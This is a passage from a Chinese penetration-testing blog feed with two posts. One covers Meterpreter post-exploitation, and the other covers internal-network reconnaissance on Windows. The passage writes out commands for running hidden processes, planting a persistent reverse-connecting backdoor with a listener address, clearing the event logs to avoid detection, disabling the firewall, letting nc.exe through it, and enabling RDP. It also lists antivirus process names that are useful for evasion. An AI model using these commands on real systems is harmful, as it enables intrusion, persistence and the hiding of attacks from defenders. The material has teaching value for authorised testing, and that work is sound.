title="运行程序"></a>运行程序</h2><p>在Meterpreter中，渗透测试者还可以使用execute命令在目标系统中执行应用程序。<br>该命令的语法格式如下：<br>execute options]  -f  command<br>该命令可用的选项及含义如下：<br>.-H:创建一个隐藏进程。<br>.-a:传递给命令的参数。<br>.-i:跟进程进行交互。<br>.-m:从内存中执行。<br>.-t:使用当前伪造的线程令牌运行进程。<br>.-s:在给定的会话中执行进程。<br>实例在目标主机上运行一个CMD程序。执行命令如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -s <span class="number">1</span> -f cmd</span><br><span class="line">Process <span class="number">2260</span> created.</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，创建了ID为3716的进程。此时，在目标主机上即可看到启<br>动的CMD程序<img src="https://img-blog.csdnimg.cn/20200411145013530.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h2><p>当成功获取目标系统的访问权限后，渗透测试者肯定不希望再次采用同样费力的方式<br>重新获得访问权限。由于Meterpeter是基于内存DLL建立的连接，所以，只要目标主机<br>关机，Mepreter连接就会断开。因此，为了方便后续渗透测试，可以创建持久后门。这<br>样，只要目标主机开机，将自动与攻击主机建立连接。而且，当创建持久后门后，即使连<br>接被中断，也不会影响工作。下面将介绍使用ru psisence命令创建持久后门。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下:</span><br><span class="line">run persistence -x -i &lt;opt&gt; ~P &lt;opt&gt; -r &lt;opt&gt;</span><br><span class="line">该命令支持的选项及含义如下:</span><br><span class="line"> -X:当系统启动后，自动启动代理。</span><br><span class="line"> -i&lt;opD:设置每个连接尝试的时间间隔，单位为秒。</span><br><span class="line"> -p &lt;opD&gt;: 指定Metasploit监听的端口。</span><br><span class="line"> -r &lt;ont&gt;:指定反向连接运行Metasploit系统的P地址，即攻击主机的地址，</span><br></pre></td></tr></table></figure><p>使用run persistence命令创建持久后门。执行命令如下。<br><img src="https://img-blog.csdnimg.cn/20200411145937383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从输出的信息可以看到，在目标主机中创建了一个可执行脚本。其中，该脚本文件名<br>称为从输出的信息可以看到，在目标主机中创建了一个可执行脚本。其中，该脚本文件名<br>称为MIknXcbtV.vbs. 此时，用户在目标主机的C:\Windows\temp目录中即可看到该文<br>件，如上图所示。<br>当用户在目标主机创建持久后门后，还需要在本地建立监听。这样，当目标主机重新<br>启动后，即可自动与攻击主机建立连接。下面将使用exploit/multihandler模块建立监听<br><img src="https://img-blog.csdnimg.cn/20200411150653986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从输出的信息可以看到，当前主机正在监听4444，ip地址为192.168.0.181，当目标主机重启，将主动与攻击主机建立连接。并且成功打开了一个meterpreter会话。</p><h2 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h2><p>当渗透测试者入侵目标主机后，所有操作都会记录在日志文件中。所以为了不被发现，清除痕迹是非常重要的工作。此时，使我们可以使用clearev命令清除痕迹。<br><img src="https://img-blog.csdnimg.cn/20200411151914998.png" alt="在这里插入图片描述">从输出记录中可以看到清除的相关信息，其中，清除了1463条应用程序记录、3357条系统记录和4223条安全记录。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> veil工具的使用&amp;控制meterpreter会话 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集--手动收集&amp;自动信息收集&amp;Empire下的主机信息收集</title>
      <link href="/2020/04/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86--%E6%89%8B%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&amp;%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF&amp;Empire%E4%B8%8B%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/04/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86--%E6%89%8B%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&amp;%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF&amp;Empire%E4%B8%8B%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-内网信息收集的概括"><a href="#0x00-内网信息收集的概括" class="headerlink" title="0x00 内网信息收集的概括"></a>0x00 内网信息收集的概括</h2><p>在内网渗透测试环境中，有很多的设备和防护软件。通过收集目标内网信息，洞察内网网络拓扑结构，找到内网中最薄弱的环节。</p><p>渗透人员进入内网后，需要先对当前的网络环境进行判断，所处的内网结构是什么样的、其角色是什么、使用这台机器的人的角色是什么、以及这台机器上装了什么杀毒软件等，都需要进行信息收集。</p><p>正如某大佬所说：渗透的本质就是信息收集。</p><h2 id="0x01-手动收集信息"><a href="#0x01-手动收集信息" class="headerlink" title="0x01 手动收集信息"></a>0x01 手动收集信息</h2><p>本机信息包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。 通过本机的相关信息，可以进一步了解整个域的操作系统版本、软件及补丁安装情况、用户命名方式。</p><h2 id="查询域内计算机"><a href="#查询域内计算机" class="headerlink" title="查询域内计算机"></a>查询域内计算机</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：   net view /domain:test</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407160318744.png" alt="在这里插入图片描述"></p><h2 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407160540229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><h2 id="查询操作系统及版本信息"><a href="#查询操作系统及版本信息" class="headerlink" title="查询操作系统及版本信息"></a>查询操作系统及版本信息</h2><p>(1)查询操作系统和版本信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407161121788.png" alt="在这里插入图片描述"><br>（2）查看系统体系结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407161429821.png" alt="在这里插入图片描述"><br>(3)查看安装的软件及版本,路径</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407163054429.png" alt="在这里插入图片描述"><br>利用PowerShell命令，收集软件的版本信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：powershell <span class="string">"Get-WmiObject -class Win32_Product |Select-Object -Property name,version"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407163639349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol><li>查看本机服务信息</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：  wmic service <span class="built_in">list</span> brief</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407163947970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查看进程列表"><a href="#查看进程列表" class="headerlink" title="查看进程列表"></a>查看进程列表</h2><p>(1)查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀毒软件等进程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：  tasklist</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407164113884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（2）查看进程信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： wmic process <span class="built_in">list</span> brief</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020040716460645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">                                                                                                                                                                                                           <strong>常见杀毒软件进程</strong></p><table><thead><tr><th align="left">进程</th><th align="left">软件名称</th></tr></thead><tbody><tr><td align="left">360sd.exe</td><td align="left">360 杀毒</td></tr><tr><td align="left">360tray</td><td align="left">360实时保护</td></tr><tr><td align="left">ZhuDongFangYu.exe</td><td align="left">360主动防御</td></tr><tr><td align="left">KSafeTray.exe</td><td align="left">金山卫士</td></tr><tr><td align="left">SafeDogUpdateCenter.exe</td><td align="left">服务器安全狗</td></tr><tr><td align="left">McAfee McShield.exe</td><td align="left">McAfee</td></tr><tr><td align="left">egui.exe</td><td align="left">NOD32</td></tr><tr><td align="left">AVP.EXE</td><td align="left">卡巴斯基</td></tr><tr><td align="left">avguard.exe</td><td align="left">小红伞</td></tr><tr><td align="left">bdagent.exe</td><td align="left">BitDefender</td></tr></tbody></table><h2 id="查杀进程"><a href="#查杀进程" class="headerlink" title="查杀进程"></a>查杀进程</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：tskill 进程号（pip）</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407171339449.png" alt="在这里插入图片描述"></p><h2 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令: wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407174824701.png" alt="在这里插入图片描述"></p><h2 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407175337349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407175552593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h2><p>(1) 本机用户列表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：net user</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407180004953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)(2) 查询本地管理员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407180252820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（3）查看当前在线用户</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407180626876.png" alt="在这里插入图片描述"></p><h2 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： net session</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407181312144.png" alt="在这里插入图片描述"></p><h2 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h2><p> 查看端口列表、本地开发端口所对应的服务和应用程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407182243757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h2><p> （1）需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看补丁列表，就可以找到未打补丁的漏洞。可以看到，当前系统更新了75个补丁。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看补丁列表（<span class="number">1</span>） 命令：  systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407183433851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">使用wmic命令查看安装在系统中的补丁</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p>补丁的名称、描述、ID、安装时间等信息<br><img src="https://img-blog.csdnimg.cn/20200407184325206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查询本机共享列表-1"><a href="#查询本机共享列表-1" class="headerlink" title="查询本机共享列表 (1)"></a>查询本机共享列表 (1)</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： net share</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020040800214864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)(2)利用wmic命令查找共享列表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408002532342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol><li>查询路由表及所有可用接口的ARP（地址解析协议）缓存表<br>（1）查询路由表<br><img src="https://img-blog.csdnimg.cn/20200408002938438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（2）查询有可用接口的ARP缓存表<br><img src="https://img-blog.csdnimg.cn/20200408003106783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol><h2 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h2><p>(1)关闭防火墙<br>windows server 2003及之前的版本，命令如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="built_in">set</span> opmode disable</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408003555933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">windows server 2003及之后的版本，命令如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408003832725.png" alt="在这里插入图片描述"><br>(2)查看防火墙设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408004008686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（3）修改防火墙设置<br>windows server 2003及之前的版本，允许指定程序全部连接，命令如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">"allow nc"</span> enable</span><br></pre></td></tr></table></figure><p>windows server 2003之后的版本，允许指定程序进入命令如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=<span class="string">"pass nc"</span> dir=in action=allow program=<span class="string">"C: \nc.exe"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408005010998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">允许指定程序退出，命令如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Allow nc"</span> dir=out action=allow program=<span class="string">"C: \nc.exe"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408005314755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">允许3389放行，命令如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Remote Desktop"</span> protocol=TCP dir=in localport=<span class="number">3389</span> action=allow</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020040800563072.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)(4)自定义防火墙日志的储存位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">"C:\windows\temp\fw.log"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408005845500.png" alt="在这里插入图片描述"></p><h2 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a>查看代理配置情况</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行如下命令，可以看到服务器<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>的<span class="number">1080</span>端口代理配置信息。</span><br><span class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202004080103319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h2><p>(1)查看远程连接端口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在命令行环境中执行注册表查询语句，命令如下。连接的端口为<span class="number">0xd3d</span>，转换后为<span class="number">3389</span></span><br><span class="line">REG QUERY <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /V PortNumber</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408011026634.png" alt="在这里插入图片描述">（2）在windows server 2003中开启3389端口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">wmic path win32_terminalservicesetting <span class="title">where</span> <span class="params">(_CLASS  !=<span class="string">" "</span> )</span>  call setallowtsconnections 1</span></span><br></pre></td></tr></table></figure><p>(3)在windows server 2008 和 windows server 2012中开启3389端口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">namespace</span>:\\root\cimv2\<span class="function">terminalservices path win32_terminalservicesetting <span class="title">where</span> <span class="params">(_CLASS  !=<span class="string">""</span> )</span>  call setallowtsconnections 1</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> /v fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408012123106.png" alt="在这里插入图片描述"></p><h2 id="0x02-自动信息收集"><a href="#0x02-自动信息收集" class="headerlink" title="0x02 自动信息收集"></a>0x02 自动信息收集</h2><p>为了简化操作，可以创建一个脚本, 在目标机器上完成流程、服务、用户账号、用户组、网<br>络接口、硬盘信息、网络共享信息、操作系统、安装的补丁、安装的软件、启动时运行的程序、<br>时区等信息的查询工作。网上有很多类似的脚本,当然，我们也可以自己定制一个。在这里，推荐一个利用WMIC收集目标机器信息的脚本。</p><p>WMIC ( Windows Management Instrumentation Command-Line, Windows 管理工具命令行)是<br>最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问<br>WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关查询操作。<br>WMIC脚本的<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">下载地址</a><br>执行该脚本后，会将所有结果写人一个HTML文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：  wmic_info.bat</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200408095434162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408095842352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x03-Empire下的主机信息收集"><a href="#0x03-Empire下的主机信息收集" class="headerlink" title="0x03 Empire下的主机信息收集"></a>0x03 Empire下的主机信息收集</h2><p>Empire提供了用于收集主机信息的模块。输人命令“usemodule situational_awareness/host/<br>winenum”,即可在看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适<br>配器信息，共享信息等，如下图所示：<br><img src="https://img-blog.csdnimg.cn/20200408203549373.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203612788.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408203629217.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020040820364191.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img 